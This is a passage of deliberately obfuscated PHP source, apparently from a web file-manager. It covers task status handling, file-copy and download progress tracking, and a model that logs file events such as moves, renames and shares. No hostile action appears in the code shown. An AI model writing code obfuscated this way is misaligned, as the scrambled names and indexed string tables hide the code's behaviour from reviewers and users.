$“Ä±òø = is_array($«àêøÌ) ? $«àêøÌ : $“Ä±òø; } return $“Ä±òø; } public static function listData() { $ê‚ÔËŒ¢ = self::valueGet(); return array_sort_by($ê‚ÔËŒ¢, $_SERVER[¯‘·½][1810], !0); } public static function kill($±ıº†Ä) { return self::changeStatus($±ıº†Ä, self::STATYS_KILL); } public static function stop($îĞäÏÇª) { return self::changeStatus($îĞäÏÇª, self::STATYS_STOP); } public static function restart($çè¦…ìş) { return self::changeStatus($çè¦…ìş, self::STATYS_RUNNING); } public static function killAll() { $ù±µŞÇŸ =& $_SERVER[¯‘·½]; $Ã“é°ú = self::listData(); foreach ($Ã“é°ú as $àğÖ˜ö) { self::kill($àğÖ˜ö[$ù±µŞÇŸ[477]]); } sleep(2); foreach ($Ã“é°ú as $àğÖ˜ö) { self::valueSet($àğÖ˜ö[$ù±µŞÇŸ[477]], !1); } } private static function changeStatus($ôÔ³¢’, $Á¥ğ¢‚Ø) { $ß·Â›˜Ù =& $_SERVER[¯‘·½]; $ÉêÓ¶–’ = self::valueGet($ôÔ³¢’); if (!$ÉêÓ¶–’) { return !1; } $ÉêÓ¶–’[$ß·Â›˜Ù[835]] = $Á¥ğ¢‚Ø; self::valueSet($ôÔ³¢’, $ÉêÓ¶–’); self::log($ß·Â›˜Ù[1832] . $ÉêÓ¶–’[$ß·Â›˜Ù[477]] . $ß·Â›˜Ù[1833] . $Á¥ğ¢‚Ø); return !0; } public static function valueGet($İ£İæâ‚ = false) { $×¾¦ñ†¥ =& $_SERVER[¯‘·½]; if ($İ£İæâ‚) { $Êñ¡–¼¬ = Model($×¾¦ñ†¥[522])->where(array($×¾¦ñ†¥[97] => $İ£İæâ‚, $×¾¦ñ†¥[33] => $×¾¦ñ†¥[1168]))->find(); return $Êñ¡–¼¬ ? json_decode($Êñ¡–¼¬[$×¾¦ñ†¥[452]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($”ûëÎĞ‚ = false) { $¸„ÇÈçû =& $_SERVER[¯‘·½]; $´¤¡Í¯õ = array($¸„ÇÈçû[33] => $¸„ÇÈçû[1168]); if ($”ûëÎĞ‚) { $´¤¡Í¯õ[$¸„ÇÈçû[1806]] = $”ûëÎĞ‚; } $¶‰®åîõ = Model($¸„ÇÈçû[522])->where($´¤¡Í¯õ)->select(); $¶‰®åîõ = $¶‰®åîõ ? $¶‰®åîõ : array(); foreach ($¶‰®åîõ as $‚­‰±Å => $–†şËêù) { $¶‰®åîõ[$‚­‰±Å] = json_decode($–†şËêù[$¸„ÇÈçû[452]], !0); } return $¶‰®åîõ; } public static function valueSet($“êëË—À, $±Ïóêğ¬) { $ıÚœÙ· =& $_SERVER[¯‘·½]; if (!$±Ïóêğ¬) { return Model($ıÚœÙ·[522])->where(array($ıÚœÙ·[97] => $“êëË—À, $ıÚœÙ·[33] => $ıÚœÙ·[1168]))->delete(); } $Óï²ºß = json_encode($±Ïóêğ¬); if (!$Óï²ºß) { ob_start(); var_dump($±Ïóêğ¬); $Œ¼ÉÈ = ob_get_clean(); self::log($ıÚœÙ·[1834] . json_encode_force($Œ¼ÉÈ)); } if (!$“êëË—À || !$±Ïóêğ¬[$ıÚœÙ·[477]]) { return !1; } $™¾¯©Éê = array($ıÚœÙ·[33] => $ıÚœÙ·[1168], $ıÚœÙ·[1806] => USER_ID, $ıÚœÙ·[97] => $“êëË—À, $ıÚœÙ·[452] => $Óï²ºß); $Å‹§ğâ– = $ıÚœÙ·[1835]; CacheLock::lock($Å‹§ğâ–); Model($ıÚœÙ·[522])->add($™¾¯©Éê, array(), !0); CacheLock::unlock($Å‹§ğâ–); } public static function log($ªëÖ‚ªĞ) { if (!GLOBAL_DEBUG) { return; } write_log($ªëÖ‚ªĞ, $_SERVER[¯‘·½][1836]); } } class TaskFileTransfer extends Task { protected function startAfter() { $·¦åÀ­ò =& $_SERVER[¯‘·½]; $…÷Ù™‚¿ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($·¦åÀ­ò[1837], array($this, $·¦åÀ­ò[1838])); Hook::bind($·¦åÀ­ò[1332], array($this, $·¦åÀ­ò[1839])); Hook::bind($·¦åÀ­ò[1840], array($this, $·¦åÀ­ò[1841])); Hook::bind($·¦åÀ­ò[675], array($this, $·¦åÀ­ò[1842])); Hook::bind($·¦åÀ­ò[676], array($this, $·¦åÀ­ò[1843])); Hook::bind($·¦åÀ­ò[682], array($this, $·¦åÀ­ò[1844])); Hook::bind($·¦åÀ­ò[683], array($this, $·¦åÀ­ò[1845])); Hook::bind($·¦åÀ­ò[678], array($this, $·¦åÀ­ò[1846])); Hook::bind($·¦åÀ­ò[680], array($this, $·¦åÀ­ò[1847])); Hook::bind($·¦åÀ­ò[644], array($this, $·¦åÀ­ò[1848])); Hook::bind($·¦åÀ­ò[641], array($this, $·¦åÀ­ò[1848])); Hook::bind($·¦åÀ­ò[646], array($this, $·¦åÀ­ò[1848])); Hook::bind($·¦åÀ­ò[648], array($this, $·¦åÀ­ò[1848])); Hook::bind($·¦åÀ­ò[650], array($this, $·¦åÀ­ò[1848])); Hook::bind($·¦åÀ­ò[1849], array($this, $·¦åÀ­ò[1850])); Hook::bind($·¦åÀ­ò[666], array($this, $·¦åÀ­ò[1851])); $this->sourceModelCopyFlag = !1; Hook::bind($·¦åÀ­ò[1852], array($this, $·¦åÀ­ò[1853])); Hook::bind($·¦åÀ­ò[1854], array($this, $·¦åÀ­ò[1855])); Hook::bind($·¦åÀ­ò[1856], array($this, $·¦åÀ­ò[1857])); $…÷Ù™‚¿[$·¦åÀ­ò[1858]] = LNG($·¦åÀ­ò[1859]); $…÷Ù™‚¿[$·¦åÀ­ò[1860]] = 0; $…÷Ù™‚¿[$·¦åÀ­ò[1861]] = 0; $…÷Ù™‚¿[$·¦åÀ­ò[1161]] = $·¦åÀ­ò[12]; $…÷Ù™‚¿[$·¦åÀ­ò[1862]] = $·¦åÀ­ò[12]; $…÷Ù™‚¿[$·¦åÀ­ò[1863]] = 0; $…÷Ù™‚¿[$·¦åÀ­ò[1864]] = 0; $…÷Ù™‚¿[$·¦åÀ­ò[1865]] = 0; if (!$…÷Ù™‚¿[$·¦åÀ­ò[1693]]) { $…÷Ù™‚¿[$·¦åÀ­ò[1693]] = LNG($·¦åÀ­ò[1866]); } } protected function endAfter() { $»ºş£ò˜ =& $_SERVER[¯‘·½]; Hook::unbind($»ºş£ò˜[1837], array($this, $»ºş£ò˜[1838])); Hook::unbind($»ºş£ò˜[1332], array($this, $»ºş£ò˜[1839])); Hook::unbind($»ºş£ò˜[1840], array($this, $»ºş£ò˜[1841])); Hook::unbind($»ºş£ò˜[675], array($this, $»ºş£ò˜[1842])); Hook::unbind($»ºş£ò˜[676], array($this, $»ºş£ò˜[1843])); Hook::unbind($»ºş£ò˜[682], array($this, $»ºş£ò˜[1844])); Hook::unbind($»ºş£ò˜[683], array($this, $»ºş£ò˜[1845])); Hook::unbind($»ºş£ò˜[678], array($this, $»ºş£ò˜[1846])); Hook::unbind($»ºş£ò˜[680], array($this, $»ºş£ò˜[1847])); Hook::unbind($»ºş£ò˜[644], array($this, $»ºş£ò˜[1848])); Hook::unbind($»ºş£ò˜[641], array($this, $»ºş£ò˜[1848])); Hook::unbind($»ºş£ò˜[646], array($this, $»ºş£ò˜[1848])); Hook::unbind($»ºş£ò˜[648], array($this, $»ºş£ò˜[1848])); Hook::unbind($»ºş£ò˜[650], array($this, $»ºş£ò˜[1848])); Hook::unbind($»ºş£ò˜[1849], array($this, $»ºş£ò˜[1850])); Hook::unbind($»ºş£ò˜[666], array($this, $»ºş£ò˜[1851])); Hook::unbind($»ºş£ò˜[1852], array($this, $»ºş£ò˜[1853])); Hook::unbind($»ºş£ò˜[1854], array($this, $»ºş£ò˜[1855])); Hook::unbind($»ºş£ò˜[1856], array($this, $»ºş£ò˜[1857])); } public function copyMoveStart($‡’†ÊÎ, $§æÇÉ­÷, $ğßÆ½ßÌ, $õÊğ”) { $ˆäµÄü¾ =& $_SERVER[¯‘·½]; self::log($ˆäµÄü¾[1867] . $§æÇÉ­÷ . $ˆäµÄü¾[73] . $õÊğ”); $Æ°è§Å = rtrim(TEMP_FILES, $ˆäµÄü¾[8]); if (substr($§æÇÉ­÷, 0, strlen($Æ°è§Å)) == $Æ°è§Å) { return; } if (substr($õÊğ”, 0, strlen($Æ°è§Å)) == $Æ°è§Å) { return; } $óü¿›¥» =& $this->task; $óü¿›¥»[$ˆäµÄü¾[1868]] = KodIO::transferType($‡’†ÊÎ, $ğßÆ½ßÌ); $this->update(); } public function updateAfter() { $äÃœ­áæ =& $_SERVER[¯‘·½]; $óŠÉ‹ı« =& $this->task; if (!$óŠÉ‹ı«[$äÃœ­áæ[849]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($óŠÉ‹ı«[$äÃœ­áæ[1868]] == $äÃœ­áæ[1433]) { return; } self::updateTask($óŠÉ‹ı«); } private static function updateTask(&$àîÃÛÄ) { $é³†Î‰£ =& $_SERVER[¯‘·½]; if ($àîÃÛÄ[$é³†Î‰£[1868]] == $é³†Î‰£[1303] || $àîÃÛÄ[$é³†Î‰£[1868]] == $é³†Î‰£[110]) { if ($àîÃÛÄ[$é³†Î‰£[1862]]) { $àîÃÛÄ[$é³†Î‰£[1865]] = $àîÃÛÄ[$é³†Î‰£[1864]] + $àîÃÛÄ[$é³†Î‰£[1861]]; } } else { if ($àîÃÛÄ[$é³†Î‰£[1868]] == $é³†Î‰£[1434]) { if ($àîÃÛÄ[$é³†Î‰£[1862]] == $é³†Î‰£[1303]) { $àîÃÛÄ[$é³†Î‰£[1865]] = $àîÃÛÄ[$é³†Î‰£[1864]] + $àîÃÛÄ[$é³†Î‰£[1861]] * 0.5; } else { if ($àîÃÛÄ[$é³†Î‰£[1862]] == $é³†Î‰£[110]) { $àîÃÛÄ[$é³†Î‰£[1865]] = $àîÃÛÄ[$é³†Î‰£[1864]] + $àîÃÛÄ[$é³†Î‰£[1860]] * 0.5 + $àîÃÛÄ[$é³†Î‰£[1861]] * 0.5; } } } } $àîÃÛÄ[$é³†Î‰£[1808]] = $àîÃÛÄ[$é³†Î‰£[1865]] / $àîÃÛÄ[$é³†Î‰£[849]]; if ($àîÃÛÄ[$é³†Î‰£[1808]] > 0) { $¨îÈ”ø¤ = timeFloat() - $àîÃÛÄ[$é³†Î‰£[1810]] - $àîÃÛÄ[$é³†Î‰£[1813]]; $àîÃÛÄ[$é³†Î‰£[1814]] = $¨îÈ”ø¤ * (1 - $àîÃÛÄ[$é³†Î‰£[1808]]) / $àîÃÛÄ[$é³†Î‰£[1808]]; } } public function addPath($‚ªéô²Ÿ) { $˜ÎÕ±”› =& $_SERVER[¯‘·½]; if (!$‚ªéô²Ÿ) { return; } $Š¯ò“ƒ  =& $this->task; $²²§ƒÈ = IO::infoWithChildren($‚ªéô²Ÿ); $ÃÏµË¸ = $Š¯ò“ƒ [$˜ÎÕ±”›[1869]] ? $Š¯ò“ƒ [$˜ÎÕ±”›[1869]][$˜ÎÕ±”›[1870]] : 0; $Š¯ò“ƒ [$˜ÎÕ±”›[1869]] = array($˜ÎÕ±”›[1870] => $ÃÏµË¸ + 1, $˜ÎÕ±”›[496] => $²²§ƒÈ[$˜ÎÕ±”›[32]], $˜ÎÕ±”›[87] => $²²§ƒÈ[$˜ÎÕ±”›[87]], $˜ÎÕ±”›[586] => $²²§ƒÈ[$˜ÎÕ±”›[586]] ? $²²§ƒÈ[$˜ÎÕ±”›[586]] : $²²§ƒÈ[$˜ÎÕ±”›[87]]); if ($²²§ƒÈ[$˜ÎÕ±”›[33]] == $˜ÎÕ±”›[233]) { $Š¯ò“ƒ [$˜ÎÕ±”›[1159]] += 1; } else { $Š¯ò“ƒ [$˜ÎÕ±”›[1159]] += $²²§ƒÈ[$˜ÎÕ±”›[82]][$˜ÎÕ±”›[80]]; if ($²²§ƒÈ[$˜ÎÕ±”›[194]]) { $Š¯ò“ƒ [$˜ÎÕ±”›[1159]] += $²²§ƒÈ[$˜ÎÕ±”›[82]][$˜ÎÕ±”›[81]] + 1; } } $Š¯ò“ƒ [$˜ÎÕ±”›[849]] += $²²§ƒÈ[$˜ÎÕ±”›[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($—Ÿ©ŞÛ¢) { } public function sourceAddHashEnd($˜ú³õ§ú) { } public function sourceAddFileStart($ê°æÊãÊ) { $±ÔƒäÉ™ =& $_SERVER[¯‘·½]; $¯™‘‘€æ =& $this->task; $¯™‘‘€æ[$±ÔƒäÉ™[1860]] = $ê°æÊãÊ[$±ÔƒäÉ™[79]]; $¯™‘‘€æ[$±ÔƒäÉ™[1858]] = $ê°æÊãÊ[$±ÔƒäÉ™[32]]; $¯™‘‘€æ[$±ÔƒäÉ™[1161]] = $ê°æÊãÊ[$±ÔƒäÉ™[32]]; $¯™‘‘€æ[$±ÔƒäÉ™[1871]] = $ê°æÊãÊ[$±ÔƒäÉ™[87]]; $this->update(); } public function sourceAddFileEnd($¯Öû‡ó) { $à¿ò™„† =& $_SERVER[¯‘·½]; $æÖˆĞ“Ã =& $this->task; $æÖˆĞ“Ã[$à¿ò™„†[1865]] += $¯Öû‡ó[$à¿ò™„†[79]]; $æÖˆĞ“Ã[$à¿ò™„†[1871]] = $¯Öû‡ó[$à¿ò™„†[87]]; $this->update(1); } public function copyFileStart($¦ÂŠƒÇì, $¡Ş™¦·ó, $ıÌòßÜ, $ºÖøï¤ï, $Ï¸§¶–Ü, $ÍÛÏíÜ¾) { $‡ñ£É… =& $_SERVER[¯‘·½]; $ª“Û»¥° = $Ï¸§¶–Ü; if ($ª“Û»¥° == $GLOBALS[$‡ñ£É…[1872]]) { $ª“Û»¥° = $GLOBALS[$‡ñ£É…[1873]]; } $GLOBALS[$‡ñ£É…[1873]] = $Ï¸§¶–Ü; $GLOBALS[$‡ñ£É…[1872]] = $ÍÛÏíÜ¾; $šçÅ†õä =& $this->task; $šçÅ†õä[$‡ñ£É…[1858]] = $ª“Û»¥°; $šçÅ†õä[$‡ñ£É…[1860]] = (int) $¦ÂŠƒÇì->size($¡Ş™¦·ó); $šçÅ†õä[$‡ñ£É…[1861]] = 0; $šçÅ†õä[$‡ñ£É…[1161]] = $‡ñ£É…[12]; $šçÅ†õä[$‡ñ£É…[1862]] = $‡ñ£É…[12]; $šçÅ†õä[$‡ñ£É…[1863]] = 0; $ï˜¬ìòº = $šçÅ†õä[$‡ñ£É…[1860]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($šçÅ†õä[$‡ñ£É…[477]] . $‡ñ£É…[1874]); if ($ï˜¬ìòº && file_exists(get_path_father($ºÖøï¤ï))) { Cache::set($šçÅ†õä[$‡ñ£É…[477]] . $‡ñ£É…[1874], $ºÖøï¤ï); $šçÅ†õä[$‡ñ£É…[1831]] = array($‡ñ£É…[1875], $‡ñ£É…[1876]); } $this->update(0, $ï˜¬ìòº); } public static function updateCopyLocalFileSize($»ÑÆ“ıá) { $ÇÄÚºÜĞ =& $_SERVER[¯‘·½]; $òç‚ÇÃí = Cache::get($»ÑÆ“ıá[$ÇÄÚºÜĞ[477]] . $ÇÄÚºÜĞ[1874]); if (!$òç‚ÇÃí || !file_exists($òç‚ÇÃí)) { return $»ÑÆ“ıá; } $»ÑÆ“ıá[$ÇÄÚºÜĞ[1861]] = @filesize($òç‚ÇÃí); $»ÑÆ“ıá[$ÇÄÚºÜĞ[1865]] += $»ÑÆ“ıá[$ÇÄÚºÜĞ[1861]]; self::updateTask($»ÑÆ“ıá); return $»ÑÆ“ıá; } public function copyFileEnd($“Úµ¡€ü, $ãÉœòã³, $Š§½ö‘¡, $±÷ÎĞÌ¬, $”¤àŸ‚, $¬äãß¹¸) { $»øÌè… =& $_SERVER[¯‘·½]; $·£Âô™ =& $this->task; $·£Âô™[$»øÌè…[1861]] = $·£Âô™[$»øÌè…[1860]]; $·£Âô™[$»øÌè…[1862]] = $»øÌè…[12]; unset($·£Âô™[$»øÌè…[1831]]); if ($”¤àŸ‚ == $·£Âô™[$»øÌè…[1858]]) { $·£Âô™[$»øÌè…[1864]] += $·£Âô™[$»øÌè…[1860]]; $·£Âô™[$»øÌè…[1865]] = $·£Âô™[$»øÌè…[1864]]; $ĞÌİû¤ = 1; if (isset($·£Âô™[$»øÌè…[1871]]) && $·£Âô™[$»øÌè…[1871]] == $ãÉœòã³) { $ĞÌİû¤ = 0; } $this->update($ĞÌİû¤); } else { $this->update(); $·£Âô™[$»øÌè…[1861]] = 0; } Cache::remove($·£Âô™[$»øÌè…[477]] . $»øÌè…[1874]); self::log($»øÌè…[1877] . $ãÉœòã³ . $»øÌè…[73] . $±÷ÎĞÌ¬ . $»øÌè…[288] . $”¤àŸ‚ . $»øÌè…[1878] . $·£Âô™[$»øÌè…[1858]]); } public function updateFileEnd($÷ÚÄŸÖÎ, $Ò§¬–Ü) { $Ü±Ç¡í§ =& $_SERVER[¯‘·½]; $ÃáÕ®éµ =& $this->task; $ÃáÕ®éµ[$Ü±Ç¡í§[1858]] = $÷ÚÄŸÖÎ; $ÃáÕ®éµ[$Ü±Ç¡í§[1860]] = $Ò§¬–Ü; $ÃáÕ®éµ[$Ü±Ç¡í§[1864]] += $Ò§¬–Ü; $ÃáÕ®éµ[$Ü±Ç¡í§[1865]] = $ÃáÕ®éµ[$Ü±Ç¡í§[1864]]; $this->update(1); self::log($Ü±Ç¡í§[1879] . $÷ÚÄŸÖÎ); } public function sourceModelCopy($µï‘£) { $×Ì¹´œ =& $_SERVER[¯‘·½]; $ÑØé…¡³ = $µï‘£[0]; $§‡ã•¶â = $µï‘£[1]; $à¸ÔÅûœ =& $this->task; $this->sourceModelCopyFlag = !0; $Õ‹ìÙßí = 0; switch ($ÑØé…¡³) { case $×Ì¹´œ[642]: $Õ‹ìÙßí = 1; break; case $×Ì¹´œ[645]: $à¸ÔÅûœ[$×Ì¹´œ[1858]] = $§‡ã•¶â[$×Ì¹´œ[32]]; break; case $×Ì¹´œ[647]: $Õ‹ìÙßí = intval($µï‘£[$×Ì¹´œ[458]] * 0.4); break; case $×Ì¹´œ[649]: $Õ‹ìÙßí = intval($µï‘£[$×Ì¹´œ[458]] * 0.2); break; case $×Ì¹´œ[651]: $Õ‹ìÙßí = intval($µï‘£[$×Ì¹´œ[458]] * 0.4); break; } $this->update($Õ‹ìÙßí); $this->sourceModelCopyFlag = !1; } public function sourceRemove($è®àé©Ø, $ÍÉë³Ç) { $µ³ß®ñç =& $_SERVER[¯‘·½]; $this->sourceModelCopyFlag = !0; $Ò§øÏè = 1; if (isset($è®àé©Ø[$µ³ß®ñç[82]])) { $Ò§øÏè = $è®àé©Ø[$µ³ß®ñç[82]][$µ³ß®ñç[80]]; $Ò§øÏè = $Ò§øÏè + $è®àé©Ø[$µ³ß®ñç[82]][$µ³ß®ñç[81]] + 1; } $this->update($Ò§øÏè); $this->sourceModelCopyFlag = !1; } public function sourceMove($ ïæÌÀÃ) { $this->sourceRemove($ ïæÌÀÃ, !1); } public function curlProgress($úåæìÃ’, $¤İó¨Ù¥, $—Àğ’í›, $‡ğâä‡¨, $îşÂéš) { $òßşí” =& $_SERVER[¯‘·½]; $°±×‚“ì =& $this->task; if ($îşÂéš > 0) { $°±×‚“ì[$òßşí”[1161]] = $òßşí”[1880]; $°±×‚“ì[$òßşí”[1862]] = $òßşí”[110]; if ($°±×‚“ì[$òßşí”[1860]]) { $°±×‚“ì[$òßşí”[1861]] = $îşÂéš; } if ($°±×‚“ì[$òßşí”[1863]]) { $°±×‚“ì[$òßşí”[1861]] = $îşÂéš + $°±×‚“ì[$òßşí”[1863]]; } } else { if ($—Àğ’í› > 0) { if ($°±×‚“ì[$òßşí”[1860]] == $¤İó¨Ù¥) { $°±×‚“ì[$òßşí”[1861]] = $—Àğ’í›; $°±×‚“ì[$òßşí”[1161]] = $òßşí”[1881]; $°±×‚“ì[$òßşí”[1862]] = $òßşí”[1303]; } } } $this->update(); } public function curlProgressStart($Ş“…¿ä¦) { } public function curlProgressEnd($¢ùË½‡é) { $Ğ•…Ê×— =& $_SERVER[¯‘·½]; $ ³ñÄñË =& $this->task; $Ó™ıÆõƒ = curl_getinfo($¢ùË½‡é); $—ü¾Ú“ = $Ó™ıÆõƒ[$Ğ•…Ê×—[1882]]; if ($—ü¾Ú“ == -1) { $—ü¾Ú“ = $Ó™ıÆõƒ[$Ğ•…Ê×—[1883]]; } if ($ ³ñÄñË[$Ğ•…Ê×—[1862]] == $Ğ•…Ê×—[110] && $—ü¾Ú“) { $ ³ñÄñË[$Ğ•…Ê×—[1863]] += $—ü¾Ú“; } $this->update(); } } goto CåÉ‰ï·‹; E‘°—Ç¯Œù: class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\x6f\x75\162\x63\x65\137\145\166\x65\x6e\x74"; protected $dataAuto = array(array("\x63\x72\145\141\x74\x65\x54\x69\155\x65", "\164\x69\155\145", "\x69\156\x73\x65\x72\x74", "\146\x75\x6e\x63\x74\x69\157\156"), array("\x64\x65\163\143", '', "\151\156\x73\x65\162\x74\54\x75\160\x64\x61\164\145\x2c\163\145\x6c\145\x63\x74", "\x6a\163\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($¿ŞíÑÒÔ, $¬»„ÇŸ¤, $â·¥Îä• = '') { $îŞÉ‹ò‘ =& $_SERVER[¯‘·½]; if (!$this->eventSave) { return; } $¨ö¼Ãè› = Model($îŞÉ‹ò‘[1452])->sourceInfo($¿ŞíÑÒÔ); if (!$¨ö¼Ãè›) { return !1; } if ($this->isDisableEvent($¨ö¼Ãè›, $¬»„ÇŸ¤)) { return; } if ($â·¥Îä• && is_string($â·¥Îä•)) { $â·¥Îä• = array($îŞÉ‹ò‘[2045] => $â·¥Îä•); } $Õá€â = defined($îŞÉ‹ò‘[2237]) ? USER_ID : 0; $±øûöÙ‚ = array($îŞÉ‹ò‘[493] => $¿ŞíÑÒÔ, $îŞÉ‹ò‘[2238] => $¨ö¼Ãè›[$îŞÉ‹ò‘[193]], $îŞÉ‹ò‘[2239] => $¨ö¼Ãè›[$îŞÉ‹ò‘[32]], $îŞÉ‹ò‘[586] => !empty($¨ö¼Ãè›[$îŞÉ‹ò‘[586]]) ? $¨ö¼Ãè›[$îŞÉ‹ò‘[586]] : $îŞÉ‹ò‘[12], $îŞÉ‹ò‘[1797] => $Õá€â, $îŞÉ‹ò‘[498] => $¬»„ÇŸ¤, $îŞÉ‹ò‘[1799] => $â·¥Îä•); $this->addSystemLog($¬»„ÇŸ¤, $±øûöÙ‚); unset($±øûöÙ‚[$îŞÉ‹ò‘[2239]], $±øûöÙ‚[$îŞÉ‹ò‘[586]]); return $this->add($±øûöÙ‚); } private function addSystemLog($îö‚ô§•, $Ì‰·Ú¦) { $êµšåì€ =& $_SERVER[¯‘·½]; if ($îö‚ô§• == $êµšåì€[2240]) { $îö‚ô§• = $Ì‰·Ú¦[$êµšåì€[528]][$êµšåì€[2241]]; } else { if (in_array($îö‚ô§•, array($êµšåì€[1986], $êµšåì€[2242]))) { $îö‚ô§• = $Ì‰·Ú¦[$êµšåì€[528]][$êµšåì€[171]]; } } $ˆ½ãÃ„µ = array_merge($Ì‰·Ú¦, array($êµšåì€[2243] => $Ì‰·Ú¦[$êµšåì€[194]], $êµšåì€[2244] => $Ì‰·Ú¦[$êµšåì€[2244]])); Hook::trigger($êµšåì€[2245], $êµšåì€[2246] . $îö‚ô§•, $Ì‰·Ú¦); Model($êµšåì€[1951])->addLog($êµšåì€[2246] . $îö‚ô§•, $ˆ½ãÃ„µ); } private function isDisableEvent($œ‹İå¸é, $ÜÁö¬Û) { $ıô¼“ôÆ =& $_SERVER[¯‘·½]; if ($œ‹İå¸é[$ıô¼“ôÆ[191]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($ÜÁö¬Û == $ıô¼“ôÆ[1251]) { return !1; } return !0; } public function eventCreate($†Ò÷ƒ‹ª, $æ¬—îõ˜) { $ñş¸½Ü· =& $_SERVER[¯‘·½]; $ŒÉªê¨‡ = Model($ñş¸½Ü·[1452])->sourceInfo($†Ò÷ƒ‹ª); $×¡˜•ìÏ = array($ñş¸½Ü·[2241] => $æ¬—îõ˜, $ñş¸½Ü·[32] => $ŒÉªê¨‡[$ñş¸½Ü·[32]]); return $this->addEvent($†Ò÷ƒ‹ª, $ñş¸½Ü·[2240], $×¡˜•ìÏ); } public function eventFileEdit($Ü‡àŞ¿Ğ) { $ˆ¾ÕòşÄ =& $_SERVER[¯‘·½]; $ŸÜ÷ÈÁ“ = array($ˆ¾ÕòşÄ[2247] => $_SERVER[$ˆ¾ÕòşÄ[2248]], $ˆ¾ÕòşÄ[2249] => strtolower(ACTION)); if (isset($GLOBALS[$ˆ¾ÕòşÄ[7]][$ˆ¾ÕòşÄ[2250]])) { $ŸÜ÷ÈÁ“[$ˆ¾ÕòşÄ[2250]] = $ˆ¾ÕòşÄ[91]; } return $this->addEvent($Ü‡àŞ¿Ğ, $ˆ¾ÕòşÄ[1976], $ŸÜ÷ÈÁ“); } public function eventRecycle($¶âäŒì£, $Ë•í÷§Ÿ) { return $this->addEvent($¶âäŒì£, $_SERVER[¯‘·½][2242], $Ë•í÷§Ÿ); } private static $_removeLast = ''; public function eventRemove($ï±ˆ¤Õ—) { $®®Ù¦ìğ =& $_SERVER[¯‘·½]; self::$_removeLast = $ï±ˆ¤Õ—; $Ù‰—Çî€ = Model($®®Ù¦ìğ[1452])->sourceInfo($ï±ˆ¤Õ—); $õ¤Û¶åˆ = array_field_key($Ù‰—Çî€, array($®®Ù¦ìğ[194], $®®Ù¦ìğ[545], $®®Ù¦ìğ[507], $®®Ù¦ìğ[588])); $«²¶Ìøı = array($®®Ù¦ìğ[171] => $Ù‰—Çî€[$®®Ù¦ìğ[32]], $®®Ù¦ìğ[2249] => ACTION, $®®Ù¦ìğ[2251] => $õ¤Û¶åˆ); return $this->addEvent($Ù‰—Çî€[$®®Ù¦ìğ[193]], $®®Ù¦ìğ[1251], $«²¶Ìøı); } public function eventShare($†äÅäñ, $ÜÆÉÎç×) { return $this->addEvent($†äÅäñ, $_SERVER[¯‘·½][1986], $ÜÆÉÎç×); } public function eventMove($ÊßÒÏŒ¶, $šÚØÜ‰­, $ûçò¹‹Æ) { $£œÖ²ò“ =& $_SERVER[¯‘·½]; if (self::$_removeLast == $ÊßÒÏŒ¶) { return; } $Òà¶¥‰Û = Model($£œÖ²ò“[1452]); $ÊØ»½ßĞ = $Òà¶¥‰Û->sourceInfo($ÊßÒÏŒ¶); $¼ŸÜŠŞ = $Òà¶¥‰Û->sourceInfo($šÚØÜ‰­); $”ÈÉĞÚÄ = $Òà¶¥‰Û->sourceInfo($ûçò¹‹Æ); $®­Ç–½ç = array($£œÖ²ò“[1263] => $šÚØÜ‰­, $£œÖ²ò“[2252] => $¼ŸÜŠŞ[$£œÖ²ò“[32]], $£œÖ²ò“[2228] => !empty($¼ŸÜŠŞ[$£œÖ²ò“[586]]) ? $¼ŸÜŠŞ[$£œÖ²ò“[586]] : $£œÖ²ò“[12], $£œÖ²ò“[1264] => $ûçò¹‹Æ, $£œÖ²ò“[2253] => $”ÈÉĞÚÄ[$£œÖ²ò“[32]], $£œÖ²ò“[2254] => !empty($”ÈÉĞÚÄ[$£œÖ²ò“[586]]) ? $”ÈÉĞÚÄ[$£œÖ²ò“[586]] : $£œÖ²ò“[12]); $this->addEvent($ÊßÒÏŒ¶, $£œÖ²ò“[627], $®­Ç–½ç); $ÊØ»½ßĞ = $Òà¶¥‰Û->sourceInfo($ÊßÒÏŒ¶); $®­Ç–½ç = array($£œÖ²ò“[194] => $ÊØ»½ßĞ[$£œÖ²ò“[194]], $£œÖ²ò“[32] => $ÊØ»½ßĞ[$£œÖ²ò“[32]]); $this->addEvent($šÚØÜ‰­, $£œÖ²ò“[2255], $®­Ç–½ç); } public function eventCopy($‘øÙÌ»ı) { $this->eventCreate($‘øÙÌ»ı, $_SERVER[¯‘·½][625]); } public function eventRename($é¸ª‹¯, $ûŒîÇÏ, $¤¢áëèÕ) { $šâ›íòÍ =& $_SERVER[¯‘·½]; $¤ùÉªšô = array($šâ›íòÍ[1263] => $ûŒîÇÏ, $šâ›íòÍ[1264] => $¤¢áëèÕ); return $this->addEvent($é¸ª‹¯, $šâ›íòÍ[1466], $¤ùÉªšô); } public function eventAddComment($»£â›™ä, $ÌÑ¤®€È) { return $this->addEvent($»£â›™ä, $_SERVER[¯‘·½][2256], $ÌÑ¤®€È); } public function eventAddDesc($…‰©××„, $—ı½ÒŒ) { return $this->addEvent($…‰©××„, $_SERVER[¯‘·½][2257], $—ı½ÒŒ); } public function listBySource($¤âïË˜Å) { $èø£©¶Š =& $_SERVER[¯‘·½]; $ìÔ›ä = Model($èø£©¶Š[1452])->sourceInfo($¤âïË˜Å); $òüÛÄË» = array($èø£©¶Š[493] => $¤âïË˜Å); if ($ìÔ›ä[$èø£©¶Š[487]] == $èø£©¶Š[91]) { $‘îÍµïí = Model($èø£©¶Š[1452])->listSearchChildren($¤âïË˜Å, 20000); $‘îÍµïí[] = $¤âïË˜Å . $èø£©¶Š[456]; $òüÛÄË» = array($èø£©¶Š[194] => array($èø£©¶Š[7], $‘îÍµïí)); } $„Æ±„ô· = $this->where($òüÛÄË»)->order($èø£©¶Š[2258])->selectPage(); if ($„Æ±„ô·[$èø£©¶Š[444]][$èø£©¶Š[445]] == 0) { $„Æ±„ô·[$èø£©¶Š[444]][$èø£©¶Š[445]] = 1; $„Æ±„ô·[$èø£©¶Š[447]] = array(array($èø£©¶Š[493] => 